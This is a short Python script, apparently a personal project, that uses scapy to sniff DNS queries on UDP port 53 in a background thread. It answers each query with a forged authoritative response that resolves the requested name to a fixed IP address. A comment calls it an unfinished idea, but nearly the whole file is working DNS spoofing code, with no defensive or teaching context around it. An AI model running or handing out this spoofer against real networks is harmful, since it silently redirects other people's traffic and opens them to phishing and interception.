from scapy.all import *
import threading

destination_ip = "142.250.179.174" #what to spoof the ip to (google.com)


dns_spoofing = True #set this to false to stop the thread

#if packet is dns and has qr=0, it is a query
def isDnsQuery(packet):
    return packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0


#todo fix this, is just an idea
def dns_spoof(packet):
    if not isDnsQuery(packet):
        return
    print("dns lookup packet detected")

    qname = packet[DNSQR].qname.decode('utf-8') #get the domain name client wants to resolve

    ip_src = packet[IP].src
    ip_dst = packet[IP].dst
    udp_sport = packet[UDP].sport
    udp_dport = packet[UDP].dport
    dns_id = packet[DNS].id
    dns_qd = packet[DNS].qd
        
    #dns record with the destination ip as resolved ip
    dns_rr = DNSRR(rrname=qname, ttl=10, rdata=destination_ip) #maybe different ip
    
    
    spoofed_response = IP(dst=ip_src, src=ip_dst) / \
                       UDP(dport=udp_sport, sport=udp_dport) / \
                       DNS(id=dns_id, qr=1, aa=1, qd=dns_qd, an=dns_rr)

    send(spoofed_response)

def dns_main_loop():
    while dns_spoofing:
        #continuously sniff and respond to dns packets (udp port 53 is used for dns)
        sniff(filter="udp port 53", prn=dns_spoof)
    

def dns_main():
    #on a thread we sniff for dns packets and respond with a spoofed response
    dns_spoofing_thread = threading.Thread(target=dns_main_loop)
    dns_spoofing_thread.start()